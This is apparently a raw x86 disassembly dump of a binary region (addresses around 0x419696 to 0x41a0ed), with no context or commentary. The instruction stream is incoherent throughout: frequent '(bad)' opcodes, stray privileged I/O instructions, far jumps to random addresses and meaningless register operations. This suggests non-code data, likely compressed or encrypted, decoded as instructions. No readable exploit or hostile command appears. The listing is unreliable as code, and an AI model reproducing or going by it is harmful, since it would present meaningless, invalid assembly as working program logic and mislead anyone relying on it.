  419696:	cmp    DWORD PTR [edi-0x1a],0xffffff91
  41969a:	xor    DWORD PTR [ecx],ebp
  41969c:	cli    
  41969d:	jle    0x41962c
  41969f:	add    esi,esi
  4196a1:	or     eax,0x8d9a9453
  4196a6:	mov    cl,0x2a
  4196a9:	cwde   
  4196aa:	test   DWORD PTR [esi],esi
  4196ac:	rcl    DWORD PTR [eax-0x39],1
  4196af:	adc    ebx,DWORD PTR [edi+0x113e7b24]
  4196b5:	(bad)  
  4196b6:	pop    edx
  4196b7:	dec    esp
  4196b8:	jns    0x419656
  4196ba:	retf   0x8f53
  4196bd:	mov    dh,0x65
  4196bf:	(bad)  
  4196c0:	iret   
  4196c1:	repz push edx
  4196c3:	jno    0x4196a9
  4196c5:	arpl   WORD PTR [edx],cx
  4196c7:	mul    DWORD PTR [ecx-0x662b7d2b]
  4196cd:	mov    dh,0xee
  4196cf:	mov    DWORD PTR [ebx+0x6aade9f9],eax
  4196d5:	dec    esi
  4196d6:	sbb    BYTE PTR [ebx],ch
  4196d8:	push   ss
  4196d9:	push   ecx
  4196da:	or     DWORD PTR [ebp-0x62],ebp
  4196dd:	fisub  DWORD PTR [edi+0x3af044d]
  4196e3:	loop   0x4196b4
  4196e5:	mov    ch,0x4
  4196e7:	lock push ecx
  4196e9:	dec    ecx
  4196ea:	sbb    ebx,edx
  4196ec:	cdq    
  4196ed:	fldcw  WORD PTR [esi+ebp*1+0x6952434e]
  4196f4:	lods   al,BYTE PTR ds:[esi]
  4196f5:	mov    al,0x3
  4196f7:	sbb    eax,0x13243a8d
  4196fc:	adc    esp,DWORD PTR [ebp+0x75]
  4196ff:	dec    dl
  419701:	dec    ebp
  419702:	and    eax,0xd3401e73
  419707:	div    DWORD PTR [ecx-0x3c3c851c]
  41970d:	not    DWORD PTR [esi]
  41970f:	inc    esi
  419710:	jmp    0x419715
	...
  419771:	add    BYTE PTR [eax],al
  419773:	add    BYTE PTR [ebx-0x29a8ec1],dh
  419779:	outs   dx,DWORD PTR ds:[esi]
  41977a:	mov    bh,0xff
  41977c:	add    eax,0x968dd0ae
  419781:	cdq    
  419782:	(bad)  
  419783:	mov    al,0x3
  419785:	push   cs
  419786:	add    DWORD PTR [eax],eax
  419788:	add    eax,0x60000001
  41978d:	push   ebx
  41978e:	or     eax,0x909baf76
  419793:	sbb    ebx,DWORD PTR [edx-0x57]
  419796:	xchg   edi,eax
  419797:	pop    ds
  419798:	bound  edx,QWORD PTR [ebp+0x1c]
  41979b:	sub    edi,esi
  41979d:	and    DWORD PTR [ecx+0x766d7003],eax
  4197a3:	outs   dx,BYTE PTR ds:[esi]
  4197a4:	fcom   DWORD PTR [ebx]
  4197a6:	dec    edx
  4197a7:	lds    edx,FWORD PTR [edx-0x21]
  4197aa:	fild   WORD PTR [eax]
  4197ac:	(bad)  
  4197ad:	in     eax,0xf9
  4197af:	add    BYTE PTR [esi+0x10],ch
  4197b2:	push   cs
  4197b3:	push   edi
  4197b4:	dec    edx
  4197b5:	loope  0x4197b0
  4197b7:	jno    0x419790
  4197b9:	retf   
  4197ba:	mov    WORD PTR [eax+ebx*4+0x452f080],fs
  4197c1:	test   eax,0xb63e0ef1
  4197c6:	(bad)  
  4197c7:	cmc    
  4197c8:	scas   al,BYTE PTR es:[edi]
  4197c9:	push   esi
  4197ca:	or     dh,BYTE PTR [edx]
  4197cc:	repz in eax,0x78
  4197cf:	fisttp WORD PTR [eax-0x7b6f5042]
  4197d5:	jle    0x419770
  4197d7:	ret    
  4197d8:	mov    eax,ds:0x3cc71516
  4197dd:	xchg   esi,eax
  4197de:	lea    esp,ds:0x91a30c62
  4197e4:	gs out 0xab,al
  4197e7:	jl     0x4197c7
  4197e9:	push   edi
  4197ea:	xlat   BYTE PTR ds:[ebx]
  4197eb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4197ec:	inc    edi
  4197ed:	scas   al,BYTE PTR es:[edi]
  4197ee:	sti    
  4197ef:	shl    BYTE PTR [ecx+0x3],0x72
  4197f3:	ja     0x419841
  4197f5:	inc    edi
  4197f6:	mov    al,es:0x6b384939
  4197fc:	push   ss
  4197fd:	test   DWORD PTR [edx],ebx
  4197ff:	sub    bl,BYTE PTR [edx-0x57]
  419802:	jp     0x4197c7
  419804:	pop    es
  419805:	jmp    0x8903cdaa
  41980a:	in     eax,dx
  41980b:	idiv   BYTE PTR [eax+eax*4+0x39]
  41980f:	pop    ebp
  419810:	xor    al,BYTE PTR [esi-0x1884bbd1]
  419816:	seta   BYTE PTR [esi+0x3a]
  41981a:	mov    ebx,0x614625de
  41981f:	data16 jae 0x41982b
  419822:	jle    0x419804
  419824:	cmp    al,0x2c
  419826:	ret    
  419827:	daa    
  419828:	cmp    eax,0xaf581f9c
  41982d:	lock gs pop ss
  419830:	mov    eax,ds:0x82fb33ab
  419835:	jp     0x419867
  419837:	test   al,0x13
  419839:	mov    eax,0x7505fda1
  41983e:	mov    edi,gs
  419840:	sti    
  419841:	jb     0x41987d
  419843:	inc    ebx
  419844:	or     DWORD PTR [ebx],esp
  419846:	xor    esp,esi
  419848:	push   edi
  419849:	or     dh,BYTE PTR [eax-0x758c7981]
  41984f:	mov    edi,0x6b8b057f
  419854:	pop    ebx
  419855:	adc    eax,0x49e6cb98
  41985a:	lahf   
  41985b:	sub    DWORD PTR [ebp+ebp*2-0x22],0xffffffd6
  419860:	adc    BYTE PTR [eax+0x50387dbb],dl
  419866:	addr16 push edx
  419868:	xor    eax,0xb04641dd
  41986d:	adc    dh,BYTE PTR [eax+0x2a6cebec]
  419873:	push   esp
  419874:	jmp    0xd648:0xb6bb7751
  41987b:	lahf   
  41987c:	out    0x36,al
  41987e:	fld    QWORD PTR [ebx+0x75]
  419881:	pop    esp
  419882:	dec    eax
  419883:	sar    ecx,1
  419885:	mov    BYTE PTR [eax+0x135ded6b],ah
  41988b:	mov    ah,0x8
  41988d:	aaa    
  41988e:	dec    BYTE PTR [ebx]
  419890:	xchg   esp,eax
	...
  4198f1:	add    BYTE PTR [eax],al
  4198f3:	add    BYTE PTR [edx-0x201eb8e7],al
  4198f9:	jmp    DWORD PTR [esi+0x45e3657b]
  4198ff:	(bad)  [ecx]
  419901:	dec    ecx
  419902:	and    DWORD PTR [esi+0x8],eax
  419905:	sgdtd  [eax]
  419908:	add    eax,0x5e000001
  41990d:	or     ebx,eax
  41990f:	mov    cl,0xd
  419911:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419912:	mov    esi,0x7fd67cdd
  419917:	sti    
  419918:	push   es
  419919:	in     al,dx
  41991a:	out    0x9f,al
  41991c:	scas   eax,DWORD PTR es:[edi]
  41991d:	fcmovb st,st(3)
  41991f:	out    0xa5,al
  419921:	jmp    0x638a48f8
  419926:	outs   dx,DWORD PTR ds:[esi]
  419927:	std    
  419928:	mov    esi,0xf8a8dfd9
  41992d:	mov    dh,0xe3
  41992f:	mov    bl,0x6e
  419931:	mov    ebx,edi
  419933:	or     DWORD PTR [edx],eax
  419935:	sub    al,BYTE PTR [eax+0x688d57d]
  41993b:	xor    ebp,DWORD PTR [ecx+eiz*2+0x7a]
  41993f:	mov    ds:0x3c61bd96,eax
  419944:	popf   
  419945:	jmp    0x509a:0x1e534552
  41994c:	test   al,0x2e
  41994e:	mov    ebp,0x8c4582dd
  419953:	aaa    
  419954:	cmc    
  419955:	jg     0x4199aa
  419957:	shl    BYTE PTR [edi+edx*4],0x90
  41995b:	xor    edi,DWORD PTR [eax+0x2be9686f]
  419961:	hlt    
  419962:	(bad)  
  419963:	push   esp
  419964:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419965:	mov    ds:0x7cb8a77c,eax
  41996a:	out    0xcd,al
  41996c:	js     0x4199b1
  41996e:	push   0x18bde3a2
  419973:	mov    WORD PTR [esi-0x16],ss
  419976:	lods   al,BYTE PTR ds:[esi]
  419977:	ins    BYTE PTR es:[edi],dx
  419978:	adc    edx,DWORD PTR [esi+0xb]
  41997b:	imul   esp,eax,0x7c52b127
  419981:	push   esi
  419982:	in     al,dx
  419983:	xchg   DWORD PTR [edi-0x5c5bb166],edx
  419989:	mov    dh,0x3b
  41998b:	mov    esp,0xcae25fce
  419990:	xor    ch,al
  419992:	mov    bh,0x84
  419994:	cld    
  419995:	retf   0xe1a1
  419998:	icebp  
  419999:	mov    esi,0xc8706a20
  41999e:	popa   
  41999f:	imul   ebx,DWORD PTR [esp+eiz*4],0x36
  4199a3:	push   cs
  4199a4:	push   0x54
  4199a6:	shl    BYTE PTR [edi],1
  4199a8:	cmc    
  4199a9:	sub    ebp,DWORD PTR [esi-0x341406e6]
  4199af:	jl     0x4199b0
  4199b1:	lods   al,BYTE PTR ds:[esi]
  4199b2:	int    0x67
  4199b4:	pop    eax
  4199b5:	cs push 0xb271a38a
  4199bb:	xor    DWORD PTR [ecx],edi
  4199bd:	scas   al,BYTE PTR es:[edi]
  4199be:	adc    al,0x50
  4199c0:	mov    al,ds:0xf479979d
  4199c5:	jae    0x419a22
  4199c7:	sar    dh,0xf8
  4199ca:	xor    al,0x1a
  4199cc:	add    al,ch
  4199ce:	xchg   ebp,eax
  4199cf:	fsin   
  4199d1:	jmp    0xf399:0x7ad46961
  4199d8:	pop    ebp
  4199d9:	leave  
  4199da:	push   ss
  4199db:	(bad)  
  4199dc:	dec    edi
  4199dd:	repz out 0x36,eax
  4199e0:	jmp    0xc4b1d909
  4199e5:	int3   
  4199e6:	mov    WORD PTR [ebp-0x7c],ds
  4199e9:	mov    dh,0xcd
  4199eb:	jb     0x4199e8
  4199ed:	lahf   
  4199ee:	inc    edi
  4199ef:	jecxz  0x4199d5
  4199f1:	loop   0x419a66
  4199f3:	cs loope 0x419a64
  4199f6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4199f7:	mov    edx,0xe3c8f55b
  4199fc:	fcomi  st,st(4)
  4199fe:	clc    
  4199ff:	ss pop esp
  419a01:	push   es
  419a02:	and    BYTE PTR [ecx],dl
  419a04:	pop    eax
  419a05:	mov    al,ds:0x9b3842ca
  419a0a:	mov    esi,0x21d9b9cc
  419a0f:	out    dx,al
  419a10:	loopne 0x419a12
	...
  419a72:	add    BYTE PTR [eax],al
  419a74:	xor    esi,DWORD PTR [ecx]
  419a76:	xchg   ebx,eax
  419a77:	lds    edx,FWORD PTR [ebx-0x34088819]
  419a7d:	rcl    DWORD PTR ds:0x7bf7efc2,cl
  419a83:	mov    ch,0xd
  419a85:	adc    BYTE PTR [ecx],al
  419a87:	add    BYTE PTR ds:0x5b000001,al
  419a8d:	hlt    
  419a8e:	pushf  
  419a8f:	(bad)  
  419a91:	cmp    DWORD PTR [eax-0x13],ebx
  419a94:	lahf   
  419a95:	ja     0x419ad4
  419a97:	add    bl,BYTE PTR [edi+0x6e]
  419a9a:	sbb    esp,DWORD PTR ds:0xaa1432a1
  419aa0:	fstp   TBYTE PTR [eax-0x1d]
  419aa3:	lock sbb eax,0x35dc0f38
  419aa9:	jns    0x419a86
  419aab:	inc    edx
  419aac:	sub    BYTE PTR [ecx],bh
  419aae:	xchg   ecx,eax
  419aaf:	stos   BYTE PTR es:[edi],al
  419ab0:	push   eax
  419ab1:	sahf   
  419ab2:	call   0x2504d4e9
  419ab7:	jmp    0x7e7f:0xab12ae53
  419abe:	jg     0x419ad9
  419ac0:	daa    
  419ac1:	idiv   DWORD PTR [eax-0x5952cec8]
  419ac7:	mov    al,ds:0x6c4dc683
  419acc:	jge    0x419a91
  419ace:	mov    dl,0x36
  419ad0:	mov    eax,ss
  419ad2:	mov    bh,0x31
  419ad4:	sbb    BYTE PTR [edx+0x28981cac],dh
  419ada:	push   cs
  419adb:	xor    edi,DWORD PTR [eax-0x62]
  419ade:	js     0x419adf
  419ae0:	dec    ebx
  419ae1:	test   eax,0x52899e1e
  419ae6:	jecxz  0x419b56
  419ae8:	stos   DWORD PTR es:[edi],eax
  419ae9:	jl     0x419ad0
  419aeb:	hlt    
  419aec:	sub    DWORD PTR [ebx+0x5a],ebx
  419aef:	inc    esi
  419af0:	dec    edx
  419af1:	leave  
  419af2:	aas    
  419af3:	out    0xe3,eax
  419af5:	inc    edx
  419af6:	aaa    
  419af7:	fdivr  DWORD PTR [edi+0x42e38fb]
  419afd:	jge    0x419b02
  419aff:	(bad)  
  419b00:	adc    esp,DWORD PTR [edx+0x6ccbf924]
  419b06:	add    BYTE PTR [edx+0x1618502f],al
  419b0c:	sbb    DWORD PTR [ebx+edx*2-0xbc3d0c1],esp
  419b13:	std    
  419b14:	and    ebx,ecx
  419b16:	es ins BYTE PTR es:[edi],dx
  419b18:	ins    BYTE PTR es:[edi],dx
  419b19:	mov    esi,0x5d4c153c
  419b1e:	out    dx,eax
  419b1f:	jp     0x419b17
  419b21:	dec    eax
  419b22:	je     0x419b27
  419b24:	jl     0x419b4e
  419b26:	fisub  WORD PTR [ecx+esi*8-0x67]
  419b2a:	pop    es
  419b2b:	nop
  419b2c:	test   BYTE PTR [ecx],0x85
  419b2f:	or     eax,0x6e967fd4
  419b34:	inc    esp
  419b35:	push   ebp
  419b36:	inc    ebp
  419b37:	mov    eax,0xabb6ac84
  419b3c:	(bad)  
  419b3e:	mov    ebx,0x7c6dc052
  419b43:	sbb    al,0xce
  419b45:	push   ebx
  419b46:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419b47:	jnp    0x419afc
  419b49:	pushf  
  419b4a:	lahf   
  419b4b:	adc    BYTE PTR [esi-0x4d897df8],cl
  419b51:	ja     0x419b87
  419b53:	cld    
  419b54:	pop    es
  419b55:	or     esi,edi
  419b57:	mov    cl,0x11
  419b59:	add    eax,0x4aef2511
  419b5e:	inc    edi
  419b5f:	or     eax,edi
  419b61:	or     eax,0x2b8690f2
  419b66:	dec    ebp
  419b67:	fdiv   st(0),st
  419b69:	fdivr  QWORD PTR [esi+ebp*4+0x4ea1a889]
  419b70:	int    0xf8
  419b72:	call   0x3ae6532f
  419b77:	cmp    ebp,DWORD PTR [esp+edi*4]
  419b7a:	out    0x59,al
  419b7c:	or     BYTE PTR [ebx+0x36a96f4d],al
  419b82:	call   0xcdff:0x7eb4ee86
  419b89:	dec    ebp
  419b8a:	add    cl,ch
  419b8c:	lds    ebp,FWORD PTR [eax+0xa]
  419b8f:	push   esp
  419b90:	add    DWORD PTR [eax],0x0
	...
  419bf3:	add    BYTE PTR [edx-0x3c],cl
  419bf6:	cli    
  419bf7:	inc    edi
  419bf8:	(bad)  
  419bf9:	jg     0x419bfa
  419bfb:	int    0x88
  419bfd:	xchg   ecx,eax
  419bfe:	lods   al,BYTE PTR ds:[esi]
  419bff:	or     al,0x74
  419c01:	mov    ebx,0x1112bca4
  419c06:	add    DWORD PTR [eax],eax
  419c08:	add    eax,0xbf000001
  419c0d:	sti    
  419c0e:	mov    ds:0xc1059018,eax
  419c13:	out    0x99,eax
  419c15:	(bad)  
  419c16:	cmp    al,0xf0
  419c18:	aam    0xf5
  419c1a:	out    0xb,eax
  419c1c:	stos   BYTE PTR es:[edi],al
  419c1d:	mov    ds:0xec9a2955,al
  419c22:	repnz or BYTE PTR [ebp-0x1a],dh
  419c26:	call   0x60769aaa
  419c2b:	sub    esi,ebx
  419c2d:	loopne 0x419bbb
  419c2f:	or     al,0x26
  419c31:	inc    ebx
  419c32:	dec    ebx
  419c33:	mov    dh,dh
  419c35:	add    bl,BYTE PTR [ebx]
  419c37:	shr    ch,cl
  419c39:	sub    al,0xa
  419c3b:	xchg   esi,eax
  419c3c:	dec    esi
  419c3d:	in     eax,0xf0
  419c3f:	cld    
  419c40:	pop    esi
  419c41:	sbb    eax,0xbc6761bc
  419c46:	sbb    bl,BYTE PTR [ebx-0x5f]
  419c49:	or     DWORD PTR [edi+0x8],eax
  419c4c:	jle    0x419c32
  419c4e:	test   BYTE PTR [eax-0x61],bh
  419c51:	xor    esi,DWORD PTR [esp+ebp*2]
  419c54:	or     DWORD PTR [ecx+0x6660472e],0x72841cee
  419c5e:	cmc    
  419c5f:	pop    eax
  419c60:	xchg   ebp,eax
  419c61:	xchg   edi,eax
  419c62:	jbe    0x419c4d
  419c64:	rcl    DWORD PTR [edx],0x3a
  419c67:	xor    BYTE PTR [ebp+0x5be68e04],al
  419c6d:	(bad)  
  419c6e:	fmul   QWORD PTR [ebp+0x9]
  419c71:	(bad)  [edi+0x19]
  419c74:	cdq    
  419c75:	sahf   
  419c76:	xor    cl,ch
  419c78:	cmp    BYTE PTR [ecx],bl
  419c7a:	leave  
  419c7b:	(bad)  
  419c7c:	jl     0x419c41
  419c7e:	xor    eax,0x63ada86d
  419c83:	cmp    DWORD PTR [ecx],edi
  419c85:	ss es jmp 0x419ce5
  419c89:	mov    al,ds:0xa45bc29f
  419c8e:	or     eax,0xeb1d098b
  419c93:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419c94:	aaa    
  419c95:	pop    edi
  419c96:	add    eax,0xb13cecf1
  419c9b:	icebp  
  419c9c:	outs   dx,BYTE PTR ds:[esi]
  419c9d:	mov    ebx,0xf96d34b7
  419ca2:	xchg   esp,eax
  419ca3:	add    eax,0x7d40489e
  419ca8:	mov    ?,WORD PTR [esi]
  419caa:	test   BYTE PTR [eax-0x21fbc4d7],ah
  419cb0:	loop   0x419d0c
  419cb2:	out    dx,eax
  419cb3:	fninit 
  419cb5:	jns    0x419d2f
  419cb7:	mov    DWORD PTR [ebx+0x51],eax
  419cba:	ins    BYTE PTR es:[edi],dx
  419cbb:	ds es xor esi,DWORD PTR fs:[ebx-0x64]
  419cc1:	jb     0x419d27
  419cc3:	sbb    DWORD PTR [ebx+ebx*8-0x7d],esi
  419cc7:	push   ebp
  419cc8:	adc    al,0x15
  419cca:	jp     0x419c68
  419ccc:	cdq    
  419ccd:	(bad)  
  419cce:	mov    eax,ds:0xd51dc09e
  419cd3:	xchg   esp,eax
  419cd4:	xor    DWORD PTR [edi+ebx*4-0x61],ecx
  419cd8:	cmp    DWORD PTR [edi+edi*1+0x4e],eax
  419cdc:	rcl    DWORD PTR [ecx+0x2a7547e4],0xd2
  419ce3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419ce4:	popa   
  419ce5:	fld    QWORD PTR [edi+0x28e2758]
  419ceb:	mov    cl,0x3e
  419ced:	ins    DWORD PTR es:[edi],dx
  419cee:	fbld   TBYTE PTR [ebx-0xf220f60]
  419cf4:	std    
  419cf5:	xchg   ecx,eax
  419cf6:	je     0x419cea
  419cf8:	mov    WORD PTR ds:0x469ab553,ds
  419cfe:	mov    ds:0xd30e14e7,eax
  419d03:	lock jl 0x419cc5
  419d06:	xor    al,bh
  419d08:	xor    al,0x5f
  419d0a:	pop    esp
  419d0b:	les    edx,FWORD PTR [esi+edi*4+0xeb434b]
	...
  419d72:	add    BYTE PTR [eax],al
  419d74:	lock xchg edi,eax
  419d76:	std    
  419d77:	cmp    al,0xff
  419d79:	jle    0x419d6c
  419d7b:	fistp  QWORD PTR [edi-0x16]
  419d7e:	ss fcmovbe st,st(0)
  419d81:	xchg   edx,eax
  419d82:	iret   
  419d83:	stos   DWORD PTR es:[edi],eax
  419d84:	pop    ss
  419d85:	adc    al,BYTE PTR [ecx]
  419d87:	add    BYTE PTR ds:0xba000001,al
  419d8d:	mov    cl,0x2b
  419d8f:	push   ss
  419d90:	aad    0x13
  419d92:	ret    
  419d93:	sbb    ecx,esi
  419d95:	iret   
  419d96:	js     0x419d6b
  419d98:	test   BYTE PTR [ebp+0x74],dh
  419d9b:	cmp    dh,0x18
  419d9e:	int3   
  419d9f:	mov    ecx,DWORD PTR [ebp+ebx*8+0xf]
  419da3:	mov    ch,0x93
  419da5:	or     eax,0x92519f41
  419daa:	cmp    DWORD PTR [eax+0x76],0xbadf618d
  419db1:	inc    esp
  419db2:	mov    edx,0x3f18e5b1
  419db7:	mov    ch,0xcc
  419db9:	inc    edx
  419dba:	push   ss
  419dbb:	fwait
  419dbc:	mov    edx,0xfe04ae5e
  419dc1:	popf   
  419dc2:	cdq    
  419dc3:	jne    0x419d9c
  419dc5:	cmc    
  419dc6:	ret    
  419dc7:	mov    eax,ds:0x72815757
  419dcc:	repz sti 
  419dce:	and    BYTE PTR [ebx-0x620bc7db],dl
  419dd4:	xor    al,0x6a
  419dd6:	stos   BYTE PTR es:[edi],al
  419dd7:	mov    edi,0x4267bf19
  419ddc:	and    eax,0x6466cd8e
  419de1:	je     0x419d70
  419de3:	gs popa 
  419de5:	sbb    BYTE PTR [ecx],bl
  419de7:	(bad)  [edi]
  419de9:	cmp    bl,BYTE PTR [edi]
  419deb:	lock mov ecx,0xedb51ece
  419df1:	mov    esi,0x7eb6a978
  419df6:	adc    BYTE PTR [ecx-0x67],bl
  419df9:	ror    BYTE PTR ds:0xf2e1be65,cl
  419e00:	push   edi
  419e01:	adc    DWORD PTR [esi+eiz*4],eax
  419e04:	or     eax,0x5b3c26af
  419e09:	push   ds
  419e0a:	jae    0x419da8
  419e0c:	sbb    ecx,DWORD PTR [ebx-0x33]
  419e0f:	in     eax,dx
  419e10:	push   edx
  419e11:	cmp    al,0x48
  419e13:	push   0x18aa7122
  419e18:	das    
  419e19:	mov    WORD PTR [ecx-0x648363f8],ds
  419e1f:	jp     0x419de2
  419e21:	sbb    eax,0x205d2e6a
  419e26:	rcr    DWORD PTR [ebx+0x39b0fbf9],1
  419e2c:	jne    0x419e5f
  419e2e:	xor    ebp,ebp
  419e30:	into   
  419e31:	inc    ecx
  419e32:	mov    ch,0x11
  419e34:	repnz test DWORD PTR [edx],0xc4c78e91
  419e3b:	mov    edi,0x7b352a75
  419e40:	call   0xeef7:0xbd08f10e
  419e47:	push   esi
  419e48:	adc    DWORD PTR [edx],ebp
  419e4a:	js     0x419dde
  419e4c:	fild   QWORD PTR [eax+0xd]
  419e4f:	lods   al,BYTE PTR ds:[esi]
  419e50:	adc    al,BYTE PTR [eax+0x24]
  419e53:	div    BYTE PTR [esi]
  419e55:	push   ss
  419e56:	stos   DWORD PTR es:[edi],eax
  419e57:	xlat   BYTE PTR ds:[ebx]
  419e58:	mov    esi,0x8b5c8e9e
  419e5d:	cmc    
  419e5e:	push   edx
  419e5f:	push   ds
  419e60:	adc    DWORD PTR [eax+0x22061559],edi
  419e66:	pop    esi
  419e67:	lock lods eax,DWORD PTR ds:[esi]
  419e69:	dec    ecx
  419e6a:	stc    
  419e6b:	or     al,0x64
  419e6d:	scas   al,BYTE PTR es:[edi]
  419e6e:	pop    esp
  419e6f:	ds mov ch,0x4e
  419e72:	mov    bh,0xb3
  419e74:	mov    dl,ah
  419e76:	dec    ebx
  419e77:	in     eax,0x20
  419e79:	xor    eax,0x992afe78
  419e7e:	xor    dh,dh
  419e80:	mov    cl,0x18
  419e82:	call   0x9c4f5dc0
  419e87:	adc    eax,0xec213638
  419e8c:	aam    0x60
  419e8e:	daa    
  419e8f:	mov    edi,0x52
	...
  419ef4:	xchg   eax,ebx
  419ef6:	pop    ss
  419ef7:	lds    ebx,FWORD PTR [edi-0x31]
  419efa:	xlat   BYTE PTR ds:[ebx]
  419efb:	ficomp DWORD PTR [edi+ebp*4+0x55]
  419eff:	inc    esi
  419f00:	js     0x419e95
  419f02:	ret    
  419f03:	jmp    0x42b224
  419f08:	add    eax,0x50000001
  419f0d:	mov    BYTE PTR [ebx-0x2],bh
  419f10:	pop    ss
  419f11:	repz adc edx,esp
  419f14:	push   ebx
  419f15:	or     edx,DWORD PTR [ecx-0x33]
  419f18:	dec    esp
  419f19:	test   al,0x2f
  419f1b:	loopne 0x419ef0
  419f1d:	add    al,BYTE PTR [esi-0x41]
  419f20:	(bad)  [ebx]
  419f22:	and    esp,DWORD PTR [ecx-0x1b]
  419f25:	jl     0x419f02
  419f27:	inc    esi
  419f28:	xchg   DWORD PTR [ebp*2+0x4f19eb79],esi
  419f2f:	mov    bl,0x43
  419f31:	mov    ch,0x7f
  419f33:	mov    ah,0x0
  419f35:	ret    0x43a0
  419f38:	jb     0x419f5b
  419f3a:	adc    BYTE PTR [ebx+ecx*1],bl
  419f3d:	retf   0x1aa7
  419f40:	test   eax,0x47f33263
  419f45:	jno    0x419f1d
  419f47:	dec    WORD PTR [edi+0x77]
  419f4b:	repz and esi,edi
  419f4e:	mov    cl,0x89
  419f50:	push   cs
  419f51:	cmp    BYTE PTR [edi-0x7f3cfb95],ah
  419f57:	push   es
  419f58:	cmp    dh,al
  419f5a:	in     eax,0xf9
  419f5c:	cmp    dl,BYTE PTR [esi-0x11]
  419f5f:	cmp    cl,BYTE PTR [ebp+0x7d]
  419f62:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419f63:	or     edx,DWORD PTR [esi]
  419f65:	jbe    0x419f87
  419f67:	xchg   edi,eax
  419f68:	(bad)  
  419f69:	dec    esi
  419f6a:	mov    bh,0xc7
  419f6c:	in     al,0xcf
  419f6e:	in     al,dx
  419f6f:	(bad)  
  419f70:	sbb    dl,BYTE PTR [eax+0x3be98033]
  419f76:	cli    
  419f77:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419f78:	arpl   WORD PTR [ebx],dx
  419f7a:	jo     0x419fae
  419f7c:	cmp    DWORD PTR [ecx-0x53],ebx
  419f7f:	in     eax,dx
  419f80:	jl     0x419fd7
  419f82:	iret   
  419f83:	or     bh,0xa1
  419f86:	clc    
  419f87:	lods   eax,DWORD PTR ds:[esi]
  419f88:	dec    esi
  419f89:	mul    BYTE PTR [ebx]
  419f8b:	loope  0x419f95
  419f8d:	push   esp
  419f8e:	mov    edi,0xf18b8aaf
  419f93:	jecxz  0x419fe0
  419f95:	cmp    DWORD PTR [ebp+0x4a],0x70
  419f99:	dec    ebx
  419f9a:	out    dx,al
  419f9b:	mov    ch,0xa2
  419f9d:	push   0xffffffd1
  419f9f:	xchg   DWORD PTR [edi],edi
  419fa1:	mov    bl,0x9e
  419fa3:	jns    0x419f51
  419fa5:	cmp    al,0x2b
  419fa7:	mov    edx,DWORD PTR [esi-0x7e]
  419faa:	jmp    0x1c16:0xe98b38b9
  419fb1:	pop    ebx
  419fb2:	mov    edx,0x75f08d7f
  419fb7:	cmp    al,0x70
  419fb9:	jae    0x419fcf
  419fbb:	(bad)  
  419fbc:	mov    ds:0x43a4ff2b,eax
  419fc1:	stos   DWORD PTR es:[edi],eax
  419fc2:	xchg   ecx,eax
  419fc3:	mov    eax,ds:0x1ed6aa67
  419fc8:	cmp    ebx,DWORD PTR [edi+0x13]
  419fcb:	ins    BYTE PTR es:[edi],dx
  419fcc:	adc    ecx,0x6f
  419fcf:	adc    al,0xd5
  419fd1:	in     al,0x9c
  419fd3:	(bad)  
  419fd4:	jmp    0x419fd1
  419fd6:	(bad)  
  419fd7:	xchg   ecx,eax
  419fd8:	(bad)  
  419fd9:	rcr    BYTE PTR [ecx],0x2f
  419fdc:	in     al,dx
  419fdd:	out    0xd4,eax
  419fdf:	pop    ss
  419fe0:	pop    ebx
  419fe1:	xor    DWORD PTR [eax+edx*8-0x51446577],0x6a084aa0
  419fec:	js     0x419fb7
  419fee:	lods   al,BYTE PTR ds:[esi]
  419fef:	push   ebp
  419ff0:	enter  0xca53,0xbf
  419ff4:	loop   0x419fa2
  419ff6:	shufps xmm7,xmm0,0xec
  419ffa:	sahf   
  419ffb:	mov    ds:0xf3a1a191,eax
  41a000:	inc    ebp
  41a001:	and    eax,0xe54f9267
  41a006:	pop    ss
  41a007:	outs   dx,DWORD PTR ds:[esi]
  41a008:	push   es
  41a009:	fs dec ebx
  41a00b:	sbb    ah,bl
  41a00d:	sub    bh,al
  41a00f:	rcr    edi,0x0
	...
  41a072:	add    BYTE PTR [eax],al
  41a074:	dec    esi
  41a075:	jmp    0x41a0a1
  41a077:	dec    esi
  41a078:	scas   eax,DWORD PTR es:[edi]
  41a079:	iret   
  41a07a:	outs   dx,BYTE PTR ds:[esi]
  41a07b:	jmp    0x41a000
  41a07d:	push   edx
  41a07e:	test   BYTE PTR [eax+0x1d],bh
  41a081:	lahf   
  41a082:	jecxz  0x41a0a2
  41a084:	and    DWORD PTR [ecx+eax*1],edx
  41a087:	add    BYTE PTR ds:0x76000001,al
  41a08d:	in     al,dx
  41a08e:	add    bl,BYTE PTR [ecx]
  41a090:	vmulsd xmm0,xmm5,xmm4
  41a094:	(bad)  [edi]
  41a096:	ror    BYTE PTR [eax+0x47814e28],0xa4
  41a09d:	adc    eax,0xf9a293b5
  41a0a2:	(bad)  
  41a0a3:	ficom  DWORD PTR [esi-0x1a8a0eb7]
  41a0a9:	adc    BYTE PTR [eax+0xe],ch
  41a0ac:	and    eax,0x7159fd81
  41a0b1:	(bad)  
  41a0b3:	mov    edx,0x966270b1
  41a0b8:	int3   
  41a0b9:	mov    eax,0x91c5eccc
  41a0be:	xchg   ebx,eax
  41a0bf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a0c0:	jle    0x41a0dc
  41a0c2:	in     eax,dx
  41a0c3:	push   esi
  41a0c4:	mov    ecx,ebx
  41a0c6:	jb     0x41a0af
  41a0c8:	les    ecx,FWORD PTR [eax-0x49b04170]
  41a0ce:	aam    0x7f
  41a0d0:	cs dec ebx
  41a0d2:	xchg   ebx,eax
  41a0d3:	add    BYTE PTR [esi-0x60],bl
  41a0d6:	xchg   edi,eax
  41a0d7:	imul   esp,esi,0xffffffd7
  41a0da:	xor    edx,esp
  41a0dc:	jecxz  0x41a08f
  41a0de:	adc    eax,DWORD PTR [edx]
  41a0e0:	sub    eax,DWORD PTR [edx+edx*8]
  41a0e3:	inc    eax
  41a0e4:	jbe    0x41a0a9
  41a0e6:	aaa    
  41a0e7:	cld    
  41a0e8:	adc    dl,dl
  41a0ea:	adc    al,0x78
  41a0ec:	das    
  41a0ed:	aad    0x3b
